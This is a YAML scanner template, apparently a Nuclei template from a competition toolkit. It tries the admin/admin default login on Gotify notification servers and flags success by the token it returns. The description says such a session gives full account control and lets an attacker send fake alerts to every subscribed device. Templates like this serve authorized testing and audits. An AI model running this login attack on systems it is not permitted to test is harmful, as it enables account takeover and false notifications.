# Gotify default credential login attempt.
id: gotify-default-login

info:
  name: Gotify Default Credentials
  author: cptc-toolkit
  severity: high
  metadata:
    max-request: 1
    kind: attack
  description: |
    Gotify ships the documented default admin/admin (unless
    GOTIFY_DEFAULTUSER_PASS is set) and stock deployments keep it. An
    authenticated session reaches every notification stream - and on builds at
    or below 2.9.1 the POST /current/user/password endpoint takes a new password
    without the current one, so the session is full account control.

    This template POSTs the default credential to the login endpoint and matches
    the token response. A match means the emergency-notification plane is
    compromised: fake alerts to every subscribed device, plus history read.

    One POST request. The credential is a documented vendor default.
  reference:
    - https://gotify.net/docs/
  tags: notifications,gotify,default-login,attack,themepark

http:
  - raw:
      - |
        POST /login HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/json

        {"username":"admin","password":"admin"}
    redirects: false
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - '"token"'
      - type: dsl
        dsl:
          - "contains(to_lower(content_type), 'json')"
      - type: word
        part: body
        negative: true
        words:
          - '"error"'
